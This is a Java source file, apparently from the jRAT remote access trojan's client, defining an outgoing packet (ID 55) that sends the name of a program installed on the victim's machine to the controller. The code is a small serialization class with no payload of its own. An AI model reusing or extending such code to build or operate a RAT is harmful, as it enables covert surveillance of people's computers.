package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet55InstalledProgram extends AbstractOutgoingPacket {

	private String program;

	public Packet55InstalledProgram(String program) {
		this.program = program;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(program);
	}

	@Override
	public short getPacketId() {
		return 55;
	}

}
